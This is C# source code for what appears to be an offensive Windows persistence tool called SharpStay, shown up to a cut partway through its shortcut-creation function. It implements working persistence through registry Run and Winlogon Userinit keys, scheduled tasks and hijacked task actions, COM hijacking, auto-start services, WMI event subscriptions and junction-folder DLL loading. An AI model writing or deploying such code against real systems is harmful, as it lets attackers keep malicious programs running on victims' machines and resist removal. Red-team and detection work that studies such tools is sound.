using System;
using System.IO;
using System.Xml;
using System.Linq;
using TaskScheduler;
using Microsoft.Win32;
using System.Threading;
using System.Management;
using IWshRuntimeLibrary;
using System.ServiceProcess;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace SharpStay
{
    class Program
    {
        static void HowTo()
        {
            Console.WriteLine("SharpStay");
            // Add available options to each action
            Console.WriteLine("\tSharpstay.exe action=ElevatedRegistryKey");
            Console.WriteLine("\tSharpstay.exe action=UserRegistryKey");
            Console.WriteLine("\tSharpstay.exe action=UserInitMprLogonScriptKey");
            Console.WriteLine("\tSharpstay.exe action=ElevatedUserInitKey");
            Console.WriteLine("\tSharpstay.exe action=ScheduledTask");
            Console.WriteLine("\tSharpstay.exe action=ListScheduledTasks");
            Console.WriteLine("\tSharpstay.exe action=ScheduledTaskAction");
            Console.WriteLine("\tSharpstay.exe action=SchTaskCOMHijack");
            Console.WriteLine("\tSharpstay.exe action=CreateService");
            Console.WriteLine("\tSharpstay.exe action=ListRunningServices");
            Console.WriteLine("\tSharpstay.exe action=WMIEventSub");
            Console.WriteLine("\tSharpstay.exe action=GetScheduledTaskCOMHandler");
            Console.WriteLine("\tSharpstay.exe action=JunctionFolder");
            Console.WriteLine("\tSharpstay.exe action=StartupDirectory");
            Console.WriteLine("\tSharpstay.exe action=NewLNK");
            Console.WriteLine("\tSharpstay.exe action=BackdoorLNK");
            Console.WriteLine("\tSharpstay.exe action=ListTaskNames");
        }

        // Registry Items
        static void WMIElevatedRunKey(string keyname, string command)
        {
            // will probably remove
            // also no cleanup
            ManagementScope scope = new ManagementScope("\\\\.\\root\\CIMv2");
            try
            {
                scope.Connect();

                ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                inParams["hDefKey"] = 0x80000002;
                inParams["sSubKeyName"] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                inParams["sValueName"] = keyname;
                inParams["sValue"] = command;
                ManagementBaseObject outParams1 = registry.InvokeMethod("SetStringValue", inParams, null);
                Console.WriteLine("[+] Created Run Key {0} and set to {1}", keyname, command);
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[-] {0}", ex.Message));
            }
        }

        static void ElevatedRegistryKey(string keyname, string command, string keypath, bool cleanup = false)
        {
            if (cleanup == true)
            {
                try
                {
                    //Software\\Microsoft\\Windows\\CurrentVersion\\Run
                    //Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
                    RegistryKey regkey;
                    regkey = Registry.LocalMachine.OpenSubKey(keypath, true);
                    regkey.DeleteValue(keyname);
                    regkey.Close();
                    Console.WriteLine("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname);
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("[-] Error: Selected Registry value does not exist");
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Error: {0}", e.Message);
                }
            }
            else
            {
                try
                {
                    RegistryKey regkey;
                    regkey = Registry.LocalMachine.CreateSubKey(keypath);
                    regkey.SetValue(keyname, command);
                    regkey.Close();
                    Console.WriteLine("[+] Created Elevated HKLM:{0} key '{1}' and set to {2}", keypath, keyname, command);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Error: {0}", e.Message);
                }
            }
        }

        static void UserRegistryKey(string keyname, string command, string keypath, bool cleanup = false)
        {
            if (cleanup == true)
            {
                try
                {
                    RegistryKey regkey;
                    regkey = Registry.CurrentUser.OpenSubKey(keypath, true);
                    regkey.DeleteValue(keyname);
                    regkey.Close();
                    Console.WriteLine("[+] Cleaned up HKCU:{0} {1} key", keypath, keyname);
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("[-] Error: Selected Registry value does not exist");
                }
            }
            else
            {
                RegistryKey regkey;
                regkey = Registry.CurrentUser.CreateSubKey(keypath);
                regkey.SetValue(keyname, command);
                regkey.Close();
                Console.WriteLine("[+] Created User HKCU:{0} key '{1}' and set to {2}", keypath, keyname, command);
            }
        }

        static void UserInitMprLogonScriptKey(string binpath, bool cleanup = false)
        {
            if (cleanup == true)
            {
                try
                {
                    RegistryKey regkey;
                    regkey = Registry.CurrentUser.OpenSubKey("Environment", true);
                    regkey.DeleteValue("UserInitMprLogonScript");
                    regkey.Close();
                    Console.WriteLine("[+] Cleaned up HKCU:Environemnt\\UserInitMprLogonScript key");
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("[-] Error: Selected Registry value does not exist");
                }
            }
            else
            {
                RegistryKey regkey;
                regkey = Registry.CurrentUser.CreateSubKey("Environment");
                regkey.SetValue("UserInitMprLogonScript", binpath);
                regkey.Close();
                Console.WriteLine("[+] Created User HKCU:\\Environment key UserInitMprLogonScript and set to {0}", binpath);
            }
        }

        static void ElevatedRegistryUserInitKey(string binpath, bool cleanup = false)
        {
            if (cleanup == true)
            {
                try
                {
                    RegistryKey regkey;
                    regkey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                    regkey.SetValue("UserInit", "C:\\windows\\system32\\userinit.exe,");
                    regkey.Close();
                    Console.WriteLine("[+] Cleaned up HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon UserInit key");
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("[-] Error: Selected Registry value does not exist");
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Error: {0}", e.Message);
                }
            }
            else
            {
                try
                {
                    string keyname = "Userinit";
                    string updatedval = String.Format("C:\\windows\\system32\\userinit.exe,{0}", binpath);
                    RegistryKey regkey;
                    regkey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                    regkey.SetValue(keyname, updatedval);
                    regkey.Close();
                    Console.WriteLine("[+] Updated Elevated HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon key UserInit and set to {1}", keyname, updatedval);
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[-] Error: {0}", e.Message);
                }
            }
        }

        // Scheduled Task Items
        static void CreateScheduledTask(string taskName, string command, string runasuser, string triggertype, string author, string description, string rep, string attime, string startat, string logonuser)
        {
            List<string> retcmd = ParseCommand(command);
            string Directory = retcmd[0];
            string Parameters = retcmd[2];
            string Binary = retcmd[1];
            string Command = String.Format("{0}\\{1}", Directory, Binary);
            string sbound = String.Format("{0}T{1}", startat, attime);

            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
            try
            {
                scheduler.Connect();
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine("[X] Error   :  {0}", e.Message);
                return;
            }

            ITaskDefinition task = scheduler.NewTask(0);
            task.RegistrationInfo.Author = author;
            task.RegistrationInfo.Description = description;
            task.Settings.RunOnlyIfIdle = false;
            //May want to look into hidden tasks
            //task.Settings.Hidden = true;
            if (triggertype.ToLower() == "hourly")
            {
                if (rep == null)
                {
                    Console.WriteLine("[-] Hourly Scheduled task needs a repetition added, use rep=<how often> flag");
                    return;
                }
                string repetition = String.Format("PT{0}H", rep);
                ITimeTrigger trigger = (ITimeTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME);
                trigger.Id = "TimeTrigger";
                trigger.Repetition.Interval = repetition;
                trigger.StartBoundary = sbound;
                //trigger.EndBoundary = "2020-01-31T12:00:00";
            }
            else if (triggertype.ToLower() == "daily")
            {
                IDailyTrigger trigger = (IDailyTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_DAILY);
                trigger.Id = "DailyTrigger";
                //trigger.Repetition.Interval = "PT2M";
                trigger.StartBoundary = sbound;
                //trigger.EndBoundary = "2020-01-31T12:00:00";
            }
            else if (triggertype.ToLower() == "weekly")
            {
                // https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-iweeklytrigger-put_daysofweek
                IWeeklyTrigger trigger = (IWeeklyTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_WEEKLY);
                trigger.Id = "WeeklyTrigger";
                trigger.StartBoundary = sbound;
                // By default Monday-Friday
                trigger.DaysOfWeek = 62;
                trigger.WeeksInterval = 1;
            }
            else if (triggertype.ToLower() == "monthly")
            {
                // https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-imonthlytrigger-get_daysofmonth
                // https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nf-taskschd-imonthlytrigger-get_monthsofyear
                IMonthlyTrigger trigger = (IMonthlyTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_MONTHLY);
                trigger.Id = "MonthlyTrigger";
                trigger.StartBoundary = sbound;
                // By default 1st and 15th
                trigger.DaysOfMonth = 16385;
                //trigger.MonthsOfYear = 4095;
            }
            else if (triggertype.ToLower() == "idle")
            {
                IIdleTrigger trigger = (IIdleTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_IDLE);
                trigger.Id = "IdleTrigger";
            }
            else if (triggertype.ToLower() == "boot")
            {
                IBootTrigger trigger = (IBootTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_BOOT);
                trigger.Id = "BootTrigger";
            }
            else if (triggertype.ToLower() == "logon")
            {
                ILogonTrigger trigger = (ILogonTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                trigger.UserId = logonuser;
                trigger.Id = "LogonTrigger";
            }

            IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
            action.Id = "ExecAction";
            action.Path = Command;
            action.Arguments = Parameters;
            // change to allow and folder
            ITaskFolder folder = scheduler.GetFolder("\\");
            // update logon type, just in case
            try
            {
                IRegisteredTask regTask = folder.RegisterTaskDefinition(taskName, task, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, runasuser, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, "");
                Console.WriteLine("[+] Scheduled Task {0} has been created with a {1} trigger type to exec {2}", taskName, triggertype, command);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error      :  {0}", ex.Message);
                return;
            }
            //Dont run task right away, i dont know if you'd really want to
            //IRunningTask runTask = regTask.Run(null);
        }

        static void DeleteScheduledTask(string taskname)
        {
            try
            {
                TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
                try
                {
                    scheduler.Connect();
                }
                catch (UnauthorizedAccessException e)
                {
                    Console.WriteLine("[X] Error   :  {0}", e.Message);
                    return;
                }

                //Incase it isn't in root folder give option to change
                ITaskFolder containingFolder = scheduler.GetFolder("\\");
                containingFolder.DeleteTask(taskname, 0);
                Console.WriteLine("[+] Deleted task {0}", taskname);
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine("[-] Error: Must have admin privileges - {0}", e.Message);
            }
        }

        static void ListScheduledTasks()
        {
            try
            {
                string path = (@"C:\Windows\System32\Tasks");
                List<string> files = DirSearch(path);
                foreach (string f in files)
                {
                    string taskname = Path.GetFileName(f);
                    XmlDocument xmltask = new XmlDocument();
                    try
                    {
                        xmltask.Load(f);
                    }
                    catch (Exception)
                    { }
                    
                    try
                    {
                        XmlNodeList task = xmltask.GetElementsByTagName("Task");
                        XmlNodeList acts = xmltask.GetElementsByTagName("Command");
                        XmlNodeList arg = xmltask.GetElementsByTagName("Arguments");
                        XmlNodeList trig = xmltask.GetElementsByTagName("Triggers");

                        if (acts[0].InnerXml != "")
                        {
                            Console.WriteLine();
                            Console.WriteLine("   Taskname:   {0}", taskname);
                            MatchCollection matches = Regex.Matches(trig[0].InnerXml, "(?!/[a-zA-Z0-9]+Trigger)[a-zA-Z0-9]+Trigger");
                            string xa = "";
                            var uniqueMatches = matches.OfType<Match>().Select(m => m.Value).Distinct();
                            foreach (var match in uniqueMatches)
                            {
                                xa += (String.Format("{0}, ", match));
                            }
                            Console.WriteLine("    Triggers:  {0}", xa);

                            if (arg.Count < 1)
                            {
                                Console.WriteLine("    Actions:   {0}", acts[0].InnerXml);
                            }
                            else
                            {
                                Console.WriteLine("    Actions:   {0} {1}", acts[0].InnerXml, arg[0].InnerXml);
                            }
                        }
                    }
                    catch (NullReferenceException) { }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error: {0}", e.Message);
                return;
            }
        }

        static void ListTaskNames()
        {
            //Give option to specify folder to narrow search
            string path = "C:\\Windows\\System32\\Tasks";
            int sl = path.Length;
            List<string> dirs = GetDirs(path);
            dirs.Insert(0, "C:\\Windows\\System32\\Tasks\\");
            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
            try
            {
                scheduler.Connect();
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine("[X] Error   :  {0}", e.Message);
                return;
            }
            ITaskFolder f1 = scheduler.GetFolder("\\");
            ITaskFolderCollection fc = f1.GetFolders(1);
            IRegisteredTaskCollection tasks = f1.GetTasks(1);
            ITaskDefinition otask = null;
            IActionCollection actionCollection = null;
            ITriggerCollection trigcollection = null;
            string cd = string.Empty;
            foreach (string d in dirs)
            {
                try
                {
                    cd = d.Remove(0, sl);
                    f1 = scheduler.GetFolder(cd);
                    fc = f1.GetFolders(1);
                    tasks = f1.GetTasks(1);
                    foreach (IRegisteredTask tsk in tasks)
                    {
                        otask = tsk.Definition;
                        actionCollection = otask.Actions;
                        trigcollection = otask.Triggers;
                        Console.WriteLine("[+] Task name    :  {0}", tsk.Name);
                        Console.WriteLine("  [+] Folder     :  {0}", cd);
                        foreach (IAction acts in actionCollection)
                        {
                            if (acts.Type.ToString() == "TASK_ACTION_EXEC")
                            {
                                IExecAction iea = (IExecAction)acts;
                                Console.WriteLine("  [+] Action and args    :  {0} {1}", iea.Path, iea.Arguments);
                                Marshal.ReleaseComObject(iea);
                            }
                            else if (acts.Type.ToString() == "TASK_ACTION_COM_HANDLER")
                            {
                                IComHandlerAction icha = (IComHandlerAction)acts;
                                Console.WriteLine("  [+] CLSID              :  {0}", icha.ClassId);
                                Marshal.ReleaseComObject(icha);
                            }
                            Marshal.ReleaseComObject(acts);
                        }
                        foreach (ITrigger tr in trigcollection)
                        {
                            Console.WriteLine("  [+] Trigger            :  {0}", tr.Type);
                            if (tr.StartBoundary != null)
                            {
                                Console.WriteLine("  [+] Start boundary     :  {0}", tr.StartBoundary);
                            }
                            if (tr.Repetition.Interval != null)
                            {
                                Console.WriteLine("  [+] Repetition         :  {0}", tr.Repetition.Interval);
                            }
                            Marshal.ReleaseComObject(tr);
                        }
                        Console.WriteLine("");
                        Marshal.ReleaseComObject(tsk);
                    }
                }
                catch (DirectoryNotFoundException)
                { }
            }
        }

        static void AddScheduledTaskAction(string taskname, string command, string sfolder, string actionid, bool cleanup = false)
        {
            List<string> retcmd = ParseCommand(command);
            string Directory = retcmd[0];
            string Parameters = retcmd[2];
            string Binary = retcmd[1];
            string Command = String.Format("{0}\\{1}", Directory, Binary);
            string runas = string.Empty;
            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
            try
            {
                scheduler.Connect();
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine("[X] Error   :  {0}", e.Message);
                return;
            }

            ITaskFolder f1 = scheduler.GetFolder(sfolder);
            ITaskDefinition otask = null;
            IRegisteredTaskCollection tasks = f1.GetTasks(1);
            _TASK_LOGON_TYPE ltype = _TASK_LOGON_TYPE.TASK_LOGON_S4U;
            IRegistrationInfo tsksecdes = null;
            foreach (IRegisteredTask tsk in tasks)
            {
                if (tsk.Name.Equals(taskname))
                {
                    otask = tsk.Definition;
                    runas = otask.Principal.UserId;
                    ltype = otask.Principal.LogonType;
                    tsksecdes = otask.RegistrationInfo.SecurityDescriptor;
                    //tsk.GetSecurityDescriptor()
                }
                //Marshal.ReleaseComObject(tsk);
            }
            IActionCollection actionCollection = otask.Actions;
            if (cleanup == true)
            {
                actionCollection.Clear();
                Console.WriteLine("[+] Resetting actions for task {0} to '{1}'", taskname, command);
            }
            else
            {
                Console.WriteLine("[+] Adding action '{0}' to task {1}", command, taskname);
            }
            IExecAction newact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
            newact.Path = Command;
            newact.Arguments = Parameters;
            if (actionid != "" || actionid != string.Empty)
            {
                newact.Id = actionid;
            }
            otask.Actions = actionCollection;
            try
            {
                IRegisteredTask regTask = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
                Console.WriteLine("  [+] Current actions for {0}\n", taskname);
                foreach (IExecAction acts in actionCollection)
                {
                    Console.WriteLine("  [+] Taskname and ID   :  {0} - {1}", taskname, acts.Id);
                    Console.WriteLine("  [+] Action type       :  {0}", acts.Type);
                    Console.WriteLine("  [+] Action and args   :  {0} {1}", acts.Path, acts.Arguments);
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Error      :  {0}", ex.Message);
                return;
            }
        }

        static void SchTskCOMHijack(string classid, string dllpath, bool cleanup = false)
        {
            RegistryKey regkey;
            if (cleanup == true)
            {
                try
                {
                    /*
                    string key = String.Format("Software\\Classes\\CLSID\\{0}\\InprocServer32", classid);
                    regkey = Registry.CurrentUser.OpenSubKey(key);
                    string dll = regkey.GetValue("").ToString();
                    regkey.Close();
                    */
                    string regpath = "Software\\Classes\\CLSID";
                    regkey = Registry.CurrentUser.OpenSubKey(regpath, true);
                    regkey.DeleteSubKeyTree(classid);
                    regkey.Close();
                    //System.IO.File.Delete(dll);
                    Console.WriteLine("[+] Removed   : {0}", regpath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Error    : {0}", ex.Message);
                    return;
                }
            }
            else
            {
                try
                {
                    string regpath = String.Format("Software\\Classes\\CLSID\\{0}\\InprocServer32", classid);
                    regkey = Registry.CurrentUser.CreateSubKey(regpath);
                    regkey.SetValue("", dllpath);
                    regkey.Close();
                    Console.WriteLine("[+] Created {0} and set (Default) key to {1}", regpath, dllpath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Error    :  {0}", ex.Message);
                    return;
                }
            }
        }

        // Service Items
        static void CreateService(string serviceName, string binpath)
        {
            IntPtr scmHandle = OpenSCManager(null, null, SC_MANAGER_CREATE_SERVICE);
            if (scmHandle == IntPtr.Zero)
            {
                throw new Exception("[-] Failed to obtain a handle to the service control manager database - MAKE SURE YOU ARE ADMIN");
            }

            //Obtain a handle to the specified windows service
            Console.WriteLine("[+] Creating {0} service", serviceName);
            IntPtr serviceHandle = CreateService(scmHandle, serviceName, serviceName, SERVICE_ACCESS.SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, binpath, null, IntPtr.Zero, null, null, null);
            if (serviceHandle == IntPtr.Zero)
            {
                throw new Exception($"[-] Failed to obtain a handle to service '{serviceName}'.");
            }

            Console.WriteLine("[+] Starting {0} service", serviceName);
            Thread.Sleep(1000);
            StartService(serviceHandle, 0, null);
            Console.WriteLine("[+] {0} has been enabled and started", serviceName);

            //Clean up
            if (scmHandle != IntPtr.Zero)
                CloseServiceHandle(scmHandle);
            if (serviceHandle != IntPtr.Zero)
                CloseServiceHandle(serviceHandle);
        }

        static void DeleteService(string serviceName)
        {
            IntPtr scmHandle = OpenSCManager(null, null, SC_MANAGER_CREATE_SERVICE);
            if (scmHandle == IntPtr.Zero)
            {
                throw new Exception("[-] Failed to obtain a handle to the service control manager database - MAKE SURE YOU ARE ADMIN");
            }

            IntPtr serviceHandle = OpenService(scmHandle, serviceName, SERVICE_ACCESS.SERVICE_ALL_ACCESS);
            if (serviceHandle == IntPtr.Zero)
            {
                throw new Exception($"[-] Failed to obtain a handle to service '{serviceName}'.");
            }

            DeleteService(serviceHandle);
            Console.WriteLine("[+] Service {0} has been deleted", serviceName);
        }

        static void ListRunningServices()
        {
            ServiceController[] scServices;
            scServices = ServiceController.GetServices();

            Console.WriteLine("Services running on the local computer:");
            foreach (ServiceController scTemp in scServices)
            {
                if (scTemp.Status == ServiceControllerStatus.Running)
                {
                    ManagementObject wmiService;
                    wmiService = new ManagementObject("Win32_Service.Name='" + scTemp.ServiceName + "'");
                    wmiService.Get();
                    Console.WriteLine();
                    Console.WriteLine("   Service :        {0}", scTemp.ServiceName);
                    Console.WriteLine("   Display name :   {0}", scTemp.DisplayName);
                    Console.WriteLine("   Bin path :       {0}", wmiService["PathName"]);
                }

            }
        }

        // WMI Items
        static void WMIEventSub(string eventName, string command, string attime, bool cleanup)
        {
            if (cleanup == true)
            {
                try
                {
                    ManagementObject myfilter = new ManagementObject("\\\\.\\root\\subscription:__EventFilter.Name='" + eventName + "'");
                    myfilter.Delete();
                    Console.WriteLine("[+] Deleted filter for {0}", eventName);

                    ManagementObject myconsumer = new ManagementObject("\\\\.\\root\\subscription:CommandLineEventConsumer.Name='" + eventName + "'");
                    myconsumer.Delete();
                    Console.WriteLine("[+] Deleted consumer for {0}", eventName);

                    ManagementObject mybinding = new ManagementObject("\\\\.\\root\\subscription:__FilterToConsumerBinding.Consumer=\"CommandLineEventConsumer.Name=\\\"" + eventName + "\\\"\",Filter=\"__EventFilter.Name=\\\"" + eventName + "\\\"\"");
                    mybinding.Delete();
                    Console.WriteLine("[+] Deleted binding for {0}", eventName);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Error: {0}", ex.Message);
                    return;
                }
            }
            else
            {
                try
                {
                    string qu = "";
                    //Queries from Empire - need to update
                    if (attime.ToLower() == "startup")
                    {
                        qu = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
                    }
                    else if (attime.Contains(":"))
                    {
                        string[] mins = attime.Split(':');
                        qu = String.Format("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = \"{0}\" AND TargetInstance.Minute = \"{1}\" GROUP WITHIN 60", mins[0], mins[1]);
                    }
                    ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

                    ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                    WqlEventQuery myEventQuery = new WqlEventQuery(qu);
                    ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
                    myEventFilter["Name"] = eventName;
                    myEventFilter["Query"] = myEventQuery.QueryString;
                    myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                    myEventFilter["EventNameSpace"] = @"\root\cimv2";
                    try
                    {
                        Console.WriteLine("[+] Setting '{0}' event filter", eventName);
                        myEventFilter.Put();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Exception in setting event filter: {0}", ex.Message);
                    }

                    ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();

                    myEventConsumer["Name"] = eventName;
                    myEventConsumer["CommandLineTemplate"] = command;
                    myEventConsumer["RunInteractively"] = false;

                    try
                    {
                        Console.WriteLine("[+] Setting '{0}' event consumer", eventName);
                        myEventConsumer.Put();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Exception in setting event consumer: {0}", ex.Message);
                    }

                    ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                    myBinder["Filter"] = myEventFilter.Path.RelativePath;
                    myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                    try
                    {
                        Console.WriteLine("[+] Binding '{0}' event filter and consumer", eventName);
                        myBinder.Put();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                    }
                    Console.WriteLine("[+] WMI Subscription {0} has been created to run at {1}", eventName, attime);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(String.Format("[-] Exception : {0}", ex.Message));
                    return;
                }
            }
        }

        // Misc Items
        static void ReplaceBinary(string filename)
        {
            //Replace binary of service or scheduled task or anything else
            if (!System.IO.File.Exists(filename))
            {
                Console.WriteLine("File {0} does not exist", filename);
                Environment.Exit(1);
            }
            string bak = String.Format("{0}-bak", filename);
            System.IO.File.Move(filename, bak);
        }

        static void GetScheduledTaskComHandler()
        {
            string path = "C:\\Windows\\System32\\Tasks";
            int sl = path.Length;
            List<string> dirs = GetDirs(path);
            dirs.Insert(0, "C:\\Windows\\System32\\Tasks\\");
            RegistryKey regkey;
            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
            try
            {
                scheduler.Connect();
            }
            catch (UnauthorizedAccessException e)
            {
                Console.WriteLine("[X] Error   :  {0}", e.Message);
                return;
            }
            ITaskFolder f1 = scheduler.GetFolder("\\");
            ITaskFolderCollection fc = f1.GetFolders(1);
            IRegisteredTaskCollection tasks = f1.GetTasks(1);
            ITaskDefinition otask = null;
            IActionCollection actionCollection = null;
            ITriggerCollection trigcollection = null;
            string cd = string.Empty;
            string rkey = string.Empty;
            string rdll = string.Empty;
            foreach (string d in dirs)
            {
                try
                {
                    cd = d.Remove(0, sl);
                    f1 = scheduler.GetFolder(cd);
                    fc = f1.GetFolders(1);
                    tasks = f1.GetTasks(1);
                    foreach (IRegisteredTask tsk in tasks)
                    {
                        otask = tsk.Definition;
                        actionCollection = otask.Actions;
                        trigcollection = otask.Triggers;
                        foreach (IAction acts in actionCollection)
                        {
                            if (acts.Type.ToString() == "TASK_ACTION_COM_HANDLER")
                            {
                                Console.WriteLine("[+] Task name    :  {0}", tsk.Name);
                                Console.WriteLine("[+] Folder       :  {0}", cd);
                                IComHandlerAction icha = (IComHandlerAction)acts;
                                Console.WriteLine("[+] CLSID        :  {0}", icha.ClassId);

                                try
                                {
                                    rkey = String.Format("CLSID\\{0}\\InprocServer32", icha.ClassId);
                                    regkey = Registry.ClassesRoot.OpenSubKey(rkey);
                                    rdll = regkey.GetValue("").ToString();
                                    regkey.Close();
                                    Console.WriteLine("[+] DLL          :  {0}", rdll);
                                }
                                catch (NullReferenceException)
                                { }
                                foreach (ITrigger tr in trigcollection)
                                {
                                    Console.WriteLine("[+] Trigger      :  {0}", tr.Type);
                                    Marshal.ReleaseComObject(tr);
                                }

                                Console.WriteLine("[+] Context      :  {0}", actionCollection.Context);
                                Marshal.ReleaseComObject(icha);
                                Console.WriteLine("");
                            }
                            Marshal.ReleaseComObject(acts);
                        }
                        Marshal.ReleaseComObject(tsk);
                    }
                }
                catch (DirectoryNotFoundException)
                {
                }
            }
        }

        static void JunctionFolder(string dllpath, bool cleanup, string gid)
        {
            if (cleanup == true)
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Accessories\");
                string juncpath = path + "Indexing." + gid;
                string rkey = @"Software\Classes\CLSID\";
                try
                {
                    Directory.Delete(juncpath);
                    Console.WriteLine("[+] Cleaned up %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Indexing.{0}", gid);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Error: {0}", e.Message);
                }
                try
                {
                    RegistryKey regkey;
                    regkey = Registry.CurrentUser.OpenSubKey(rkey, true);
                    regkey.DeleteSubKeyTree(gid);
                    regkey.Close();
                    Console.WriteLine("[+] Cleaned up HKCU:Software\\Classes\\CLSID\\{0}", gid);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Error: {0}", e.Message);
                }
            }
            else
            {
                //Original code by matterpreter
                string guid = "{" + Convert.ToString(Guid.NewGuid()).ToUpper() + "}";

                //Create the junction folder
                string implantDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Accessories\");
                string target = implantDir + "Indexing." + guid;
                try
                {
                    Directory.CreateDirectory(target);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Unable to create the junction folder");
                    Console.WriteLine(e);
                    Environment.Exit(1);
                }
                Console.WriteLine("[+] Created junction folder at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Indexing." + guid);

                //Set up the registry key
                string key = @"Software\Classes\CLSID\" + guid + @"\InProcServer32";
                RegistryKey regkey = Registry.CurrentUser.CreateSubKey(key);
                try
                {
                    regkey.SetValue("", dllpath);
                    regkey.Close();

                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] Could not write the registry key");
                    Console.WriteLine(e.Message);
                    Environment.Exit(1);
                }
                Console.WriteLine("[+] Registry key HKCU:SOFTWARE\\Classes\\CLSID\\{0}\\InProcServer32 created", guid);
            }

        }

        static void StartupDirectory(string droppedfile)
        {
            //Drop file in Windows startup directory
        }

        static void NewLnk(string filepath, string lnkname, string lnktarget, string lnkicon)
        {
            if (!System.IO.Directory.Exists(filepath))
            {
                Console.WriteLine("[-] Directory {0} does not exist", filepath);
                Environment.Exit(1);
            }
            string lnklocation = Path.Combine(filepath, lnkname + ".lnk");
            WshShell wshell = new WshShell();
            IWshShortcut lnk = (IWshShortcut)wshell.CreateShortcut(lnklocation);

            List<string> retcmd = ParseCommand(lnktarget);
            string Directory = retcmd[0];
            string Binary = retcmd[1];
            string Parameters = retcmd[2];
            string uptp = String.Format("{0}\\{1}", Directory, Binary);
            string upic = String.Format("{0},0", lnkicon);
            lnk.TargetPath = uptp;
            lnk.Arguments = Parameters;
            lnk.WorkingDirectory = filepath;
            lnk.IconLocation = upic;
            lnk.WindowStyle = 7;
            lnk.Save();
            Console.WriteLine("[+] Created {0} to run {1}", lnklocation, lnktarget);
